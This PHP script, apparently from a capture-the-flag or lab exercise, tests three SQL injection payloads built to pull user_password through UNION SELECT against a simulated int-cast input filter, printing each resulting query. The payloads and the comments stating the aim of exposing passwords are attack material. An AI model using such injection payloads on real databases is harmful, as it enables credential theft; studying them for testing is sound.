<?php
// Necesito asegurarme de que el UNION SELECT devuelva las mismas columnas
// La query original es: SELECT user_id, user_privileges, user_name
// Mi UNION SELECT debe tener: user_id, user_privileges, user_password

// Pero quiero que muestre user_password en el campo user_name para verlo

$payloads = [
    "0,0,1))UNION SELECT 0,0,user_password FROM users WHERE user_id=0--",
    "0,0,1)) UNION SELECT user_id,0,user_password FROM users--",
    "0,0,1)) UNION SELECT 0,0,user_password FROM users--",
];

foreach ($payloads as $payload) {
    echo "\n" . str_repeat("=", 70) . "\n";
    echo "Payload: $payload\n";
    echo "Length: " . strlen($payload) . " chars\n";
    
    if (strlen($payload) > 70) {
        echo "❌ TOO LONG!\n";
        continue;
    }
    
    $tmp = explode(',', $payload);
    echo "Exploded into " . count($tmp) . " parts\n";
    
    for ($i = 0; $i < count($tmp); $i++) {
        echo "  Before: [$i] = '" . $tmp[$i] . "'\n";
        $tmp[$i] = (int)$tmp[$i];
        echo "  After int cast: [$i] = " . $tmp[$i] . "\n";
        if($tmp[$i] < 1) {
            echo "  Unsetting [$i]\n";
            unset($tmp[$i]);
        }
    }
    
    echo "After filter, array has " . count($tmp) . " elements:\n";
    print_r($tmp);
    
    $selector = implode(',', array_unique($tmp));
    echo "Selector: '$selector'\n";
    
    $query = "SELECT user_id, user_privileges, user_name FROM users WHERE (user_id in (" . $selector . "));";
    echo "Final query:\n$query\n";
}
?>
